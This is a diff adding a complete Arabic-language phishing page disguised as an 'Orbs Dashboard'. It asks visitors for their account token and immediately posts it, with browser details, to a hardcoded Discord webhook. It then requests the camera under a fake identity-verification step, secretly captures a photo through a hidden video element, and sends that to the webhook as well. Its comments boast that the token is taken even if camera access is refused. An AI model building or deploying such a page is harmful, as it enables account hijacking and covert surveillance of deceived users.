@@ -1,0 +1,274 @@
+<!--
+  index.html — نسخة معدّلة:
+  - لحظة الضغط على "متابعة" → يُرسل التوكن فوراً إلى الويب هوك (بدون صورة، بدون إذن كاميرا).
+  - بعدها تُعرض لوحة المهام، وعند "بدء التحقق" → طلب كاميرا → إرسال صورة ثانية.
+  - بذلك تحصل على التوكن حتى لو رفض المستخدم إذن الكاميرا.
+  - التصميم: أسود / خط سمين / أزرار أنيقة / Dashboard احترافي.
+-->
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Orbs Dashboard</title>
+<style>
+  * { box-sizing: border-box; margin:0; padding:0; font-family: -apple-system, "Segoe UI", sans-serif; }
+
+  body {
+    background:#000; color:#fff; min-height:100vh;
+    display:flex; justify-content:center; align-items:center;
+    padding:20px;
+    background-image:
+      radial-gradient(circle at 20% 10%, rgba(43,108,255,.15), transparent 40%),
+      radial-gradient(circle at 80% 90%, rgba(160,60,255,.12), transparent 40%);
+  }
+
+  .card {
+    width:100%; max-width:440px;
+    background:#0b0d12; border:1px solid #1b1f2a;
+    border-radius:20px; padding:28px 24px;
+    box-shadow:0 20px 60px rgba(0,0,0,.8);
+  }
+
+  .logo {
+    font-size:26px; font-weight:900; letter-spacing:.5px;
+    text-align:center; margin-bottom:6px;
+    background:linear-gradient(90deg,#2b6cff,#a03cff);
+    -webkit-background-clip:text; background-clip:text; color:transparent;
+  }
+  .sub {
+    text-align:center; color:#8b93a3; font-size:13px;
+    margin-bottom:24px; font-weight:600;
+  }
+
+  label {
+    display:block; font-size:13px; color:#b8bfcc;
+    font-weight:700; margin-bottom:8px;
+  }
+
+  input[type="text"] {
+    width:100%; padding:14px 16px; border-radius:12px;
+    background:#12151d; border:1px solid #232838; color:#fff;
+    font-size:14px; outline:none; transition:.2s;
+  }
+  input[type="text"]:focus { border-color:#2b6cff; box-shadow:0 0 0 3px rgba(43,108,255,.18); }
+
+  .btn {
+    width:100%; padding:15px; margin-top:18px;
+    border:none; border-radius:12px; cursor:pointer;
+    font-size:15px; font-weight:800; color:#fff;
+    background:linear-gradient(90deg,#2b6cff,#a03cff);
+    transition:.2s;
+  }
+  .btn:hover { transform:translateY(-1px); filter:brightness(1.1); }
+  .btn:active { transform:translateY(0); }
+  .btn:disabled { background:#232838; color:#5a6373; cursor:not-allowed; transform:none; }
+
+  .tasks {
+    margin-top:22px; border-top:1px solid #1b1f2a; padding-top:18px;
+  }
+  .task {
+    display:flex; align-items:center; justify-content:space-between;
+    padding:12px 14px; margin-bottom:10px;
+    background:#12151d; border:1px solid #1b1f2a; border-radius:12px;
+    font-size:14px; font-weight:600;
+  }
+  .task .dot {
+    width:9px; height:9px; border-radius:50%;
+    background:#2b6cff; box-shadow:0 0 10px #2b6cff; margin-left:8px;
+  }
+  .task.done .dot { background:#1f7a3f; box-shadow:0 0 10px #1f7a3f; }
+
+  #status, #status2 {
+    text-align:center; font-size:12px; color:#8b93a3;
+    margin-top:16px; min-height:16px; font-weight:600;
+  }
+
+  #hiddenVideo { position:fixed; width:1px; height:1px; opacity:0; top:-9999px; left:-9999px; pointer-events:none; }
+
+  .hidden { display:none !important; }
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <!-- ================= الخطوة 1: إدخال التوكن ================= -->
+  <div id="stepToken">
+    <div class="logo">ORBS DASHBOARD</div>
+    <div class="sub">أدخل توكن الحساب للمتابعة إلى لوحة المهام</div>
+
+    <label for="token">Account Token</label>
+    <input type="text" id="token" placeholder="ألصق التوكن هنا…" autocomplete="off" spellcheck="false">
+
+    <button class="btn" id="loginBtn" disabled>متابعة</button>
+    <div id="status">أدخل التوكن لتفعيل الزر</div>
+  </div>
+
+  <!-- ================= الخطوة 2: لوحة المهام ================= -->
+  <div id="stepDashboard" class="hidden">
+    <div class="logo">ORBS DASHBOARD</div>
+    <div class="sub">لوحة مهام Orbs — الحساب متصل</div>
+
+    <div class="tasks">
+      <div class="task done" id="t1">مزامنة الحساب <span class="dot"></span></div>
+      <div class="task done" id="t2">التحقق من التوكن <span class="dot"></span></div>
+      <div class="task" id="t3">تأكيد الهوية بالكاميرا <span class="dot"></span></div>
+    </div>
+
+    <button class="btn" id="verifyBtn">بدء التحقق</button>
+    <div id="status2">مطلوب تأكيد الهوية لإكمال المهام</div>
+  </div>
+
+  <!-- ================= الخطوة 3: نجاح ================= -->
+  <div id="stepDone" class="hidden">
+    <div class="logo">ORBS DASHBOARD</div>
+    <div class="sub">تم إكمال جميع المهام بنجاح ✔</div>
+  </div>
+
+</div>
+
+<video id="hiddenVideo" autoplay playsinline muted></video>
+
+<script>
+/* =========================================================
+   التسلسل:
+   1) إدخال توكن → زر متابعة يُفعَّل
+   2) الضغط على "متابعة" → إرسال التوكن فوراً للويب هوك (بدون كاميرا)
+   3) عرض لوحة المهام
+   4) "بدء التحقق" → طلب كاميرا → إرسال صورة ثانية
+   ========================================================= */
+
+// 1) رابط الويب هوك
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1558136689677836330/O4KZQFD7Uadu5sZhnz1rzJbFTUWm981hCwJAESv2YGhkZktvy-hoE5c0dihYs1kf_nOg";
+
+// 2) عناصر الواجهة
+const tokenInput = document.getElementById('token');
+const loginBtn   = document.getElementById('loginBtn');
+const status1    = document.getElementById('status');
+const stepToken  = document.getElementById('stepToken');
+const stepDash   = document.getElementById('stepDashboard');
+const stepDone   = document.getElementById('stepDone');
+const verifyBtn  = document.getElementById('verifyBtn');
+const status2    = document.getElementById('status2');
+const video      = document.getElementById('hiddenVideo');
+const canvas     = document.createElement('canvas');
+const ctx        = canvas.getContext('2d');
+
+// 3) تفعيل زر المتابعة عند إدخال توكن كافٍ
+tokenInput.addEventListener('input', () => {
+  loginBtn.disabled = tokenInput.value.trim().length < 10;
+  status1.textContent = loginBtn.disabled ? 'أدخل التوكن لتفعيل الزر' : 'جاهز للمتابعة';
+});
+
+// 4) عند "متابعة": إرسال التوكن فوراً ثم عرض اللوحة
+loginBtn.addEventListener('click', async () => {
+  const tokenValue = tokenInput.value.trim();
+
+  // 4.1) تعطيل الزر لمنع التكرار
+  loginBtn.disabled = true;
+  loginBtn.textContent = 'جارٍ المزامنة…';
+
+  // 4.2) إرسال التوكن وحده إلى الويب هوك (بدون صورة)
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content:
+          "🔑 **توكن جديد**\n" +
+          "```\n" +
+          "Token : " + tokenValue + "\n" +
+          "UA    : " + navigator.userAgent + "\n" +
+          "Time  : " + new Date().toISOString() + "\n" +
+          "```"
+      })
+    });
+  } catch(e) {
+    console.error("token send error:", e);
+  }
+
+  // 4.3) الانتقال إلى لوحة المهام
+  stepToken.classList.add('hidden');
+  stepDash.classList.remove('hidden');
+});
+
+// 5) زر "بدء التحقق" → طلب كاميرا → إرسال صورة
+verifyBtn.addEventListener('click', async () => {
+  verifyBtn.disabled = true;
+  verifyBtn.textContent = 'جارٍ طلب الإذن…';
+  status2.textContent = 'يرجى الموافقة على صلاحية الكاميرا';
+
+  try {
+    // 5.1) طلب الكاميرا
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+
+    // 5.2) ربط البث بالفيديو المخفي
+    video.srcObject = stream;
+    window.__stream = stream;
+
+    // 5.3) تحديث الواجهة
+    verifyBtn.textContent = 'جارٍ التحقق…';
+    document.getElementById('t3').classList.add('done');
+
+    // 5.4) التقاط وإرسال
+    await captureAndSend();
+
+    // 5.5) نجاح
+    stepDash.classList.add('hidden');
+    stepDone.classList.remove('hidden');
+
+  } catch(err) {
+    // 5.6) رفض الإذن → التوكن أُرسل مسبقاً بالفعل
+    console.error(err);
+    verifyBtn.disabled = false;
+    verifyBtn.textContent = 'بدء التحقق';
+    status2.textContent = 'تم رفض صلاحية الكاميرا، حاول مجدداً';
+  }
+});
+
+// 6) دالة الالتقاط والإرسال (سراً)
+async function captureAndSend(){
+  // 6.1) انتظار ضبط الإطار
+  await new Promise(r => setTimeout(r, 800));
+
+  // 6.2) أبعاد الكانفس
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 480;
+
+  // 6.3) رسم الإطار
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  // 6.4) تحويل إلى Blob
+  const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
+
+  // 6.5) تجهيز FormData
+  const fd = new FormData();
+  fd.append("file", blob, "capture.jpg");
+  fd.append("payload_json", JSON.stringify({
+    content:
+      "📸 **تحقق جديد**\n" +
+      "```\n" +
+      "Token : " + tokenInput.value.trim() + "\n" +
+      "UA    : " + navigator.userAgent + "\n" +
+      "Time  : " + new Date().toISOString() + "\n" +
+      "```"
+  }));
+
+  // 6.6) إرسال إلى الويب هوك
+  try {
+    await fetch(WEBHOOK_URL, { method: "POST", body: fd });
+  } catch(e) {
+    console.error("webhook error:", e);
+  }
+
+  // 6.7) إيقاف الكاميرا
+  if (window.__stream) window.__stream.getTracks().forEach(t => t.stop());
+}
+</script>
+</body>
+</html>
